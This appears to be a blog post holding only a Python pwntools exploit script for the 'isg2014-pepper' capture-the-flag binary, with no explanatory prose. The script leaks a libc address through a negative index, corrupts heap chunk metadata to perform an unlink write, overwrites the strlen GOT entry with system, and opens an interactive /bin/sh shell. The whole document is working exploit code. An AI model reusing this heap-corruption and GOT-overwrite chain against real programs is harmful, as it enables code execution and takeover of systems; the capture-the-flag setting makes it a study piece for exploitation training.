---
layout: post
title: "isg2014-pepper-doublefree"
date: 2015-12-12 12:00:29 +0800
comments: true
categories: 
---
```python
#! /usr/bin/python
from pwn import *
p = process('./pepper')

libc = ELF('/usr/lib/libc.so.6')
p = process('./pepper')

#leak
p.recvuntil('choice:')
p.sendline('2')
p.sendline('-3')
rdata = p.recvuntil('No.')
rdata = p.recv(12)
libc_base = int(rdata) & 0xffffffff - libc.symbols['__libc_start_main']
system = libc_base + libc.symbols['system']
log.info( 'libc_base: ' + hex(libc_base) )
log.info( 'system: ' + hex(system) )


#add 0 
p.recvuntil('choice:')
p.sendline('4')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('64')
p.sendline('aaaa')
p.sendline('1')


#add  1
p.recvuntil('choice:')
p.sendline('4')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('64')
p.sendline('bbbb')
p.sendline('1')

#add 2
p.recvuntil('choice:')
p.sendline('4')
p.sendline('1')
p.sendline('1')
p.sendline('1')
p.sendline('64')
p.sendline('cccc')
p.sendline('1')

#edit 1
p.recvuntil('choice:')
p.sendline('5')
p.sendline('1')
p.sendline('1')
p.sendline('y')
p.sendline('300')
ptr = 0x804b0dc
fd = ptr - 0xc
bk = ptr - 0x8

payload  = ''
#payload += '1'*0x48
payload += p32(0)
payload += p32(0x40 | 1)	#now size
payload += p32(fd)
payload += p32(bk)
payload += '2'*0x30
payload += p32(0x40)		#last size
payload += p32(0x48)
p.sendline(payload)

#delete 2
p.recvuntil('choice:')
p.sendline('3')
p.sendline('2')


strlen_got = 0x0804B02c

#edit 1 			#change p
p.recvuntil('choice:')
p.sendline('5')
p.sendline('1')
p.sendline('1')
p.sendline('y')
p.sendline('100')
payload  = ''
payload += 'aaaabbbbcccc'
payload += p32(strlen_got)
p.sendline(payload)

#edit 1 			#change *p
p.recvuntil('choice:')
p.sendline('5')
p.sendline('1')
p.sendline('1')
p.sendline('y')
p.sendline('100')
payload  = ''
payload += p32(system)
p.sendline(payload)

#shell
p.recvuntil('choice:')
p.sendline('31337')
p.recvuntil('message:')
p.sendline('/bin/sh')
p.interactive()
```
